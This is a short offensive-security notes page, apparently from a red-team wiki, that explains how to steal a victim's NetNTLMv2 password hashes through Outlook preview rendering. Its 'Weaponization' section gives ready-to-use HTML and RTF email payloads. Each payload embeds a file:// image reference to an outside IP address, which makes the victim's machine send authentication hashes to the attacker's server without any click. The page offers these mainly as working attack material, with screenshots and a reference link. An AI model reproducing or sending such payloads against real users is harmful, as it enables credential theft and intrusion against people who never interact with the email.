# NetNTLMv2 hash stealing using Outlook

## Context

If the target system is not running the latest version of windows/office, it is possible to craft such an email that allows an attacker to steal the victim's NetNTLMv2 hashes without requiring any user interaction on the email - selecting an email for its preview to be rendered is enough for the hashes to be stolen.

## Weaponization

{% code-tabs %}
{% code-tabs-item title="message.html" %}
```markup
<html>
    <h1>holla good sir</h1>
    <img src="file://157.230.60.143/download.jpg">
</html>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="message.rtf" %}
```javascript
{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://157.230.60.143/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-28-15-09-57.png)

![](../../.gitbook/assets/screenshot-from-2018-12-28-15-11-07.png)

![](../../.gitbook/assets/screenshot-from-2018-12-28-15-11-47.png)

## Execution

```text

```

![](../../.gitbook/assets/peek-2018-12-28-15-05.gif)

## References

{% embed url="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smb-hash-hijacking-and-user-tracking-in-ms-outlook/" %}

